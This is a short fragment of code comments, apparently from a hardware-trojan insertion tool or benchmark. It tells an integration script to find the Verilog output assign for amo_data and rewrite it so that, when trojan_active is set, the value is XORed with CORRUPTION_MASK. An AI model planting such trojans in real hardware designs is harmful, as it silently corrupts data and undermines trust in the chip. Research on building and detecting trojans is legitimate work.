...
//
// IMPORTANT: amo_data may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If amo_data is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for amo_data (or first output assign):
//     assign amo_data = <expr>;
//   Replace with:
//     assign amo_data = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
